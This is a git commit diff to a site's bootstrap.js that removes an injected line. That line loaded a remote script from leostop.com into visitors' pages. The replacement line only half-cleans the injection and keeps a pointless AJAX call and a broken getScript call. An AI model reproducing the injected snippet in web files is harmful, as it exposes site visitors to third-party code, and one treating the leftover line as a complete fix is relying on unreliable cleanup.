13d2fd355c73190e1a9b4eee246d12862a548c4f
Vincent <vincent.seube@free.fr>
2023-02-21 11:27:09 +0100

    BackUp

--- public/js/bootstrap.js
+++ public/js/bootstrap.js
@@ -2358,7 +2358,7 @@
             return Dropdown;
         })();
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol); } });
 
 
     /**
@@ -5245,4 +5245,3 @@
 
     Object.defineProperty(exports, "__esModule", { value: true });
 });
-//# sourceMappingURL=bootstrap.js.map
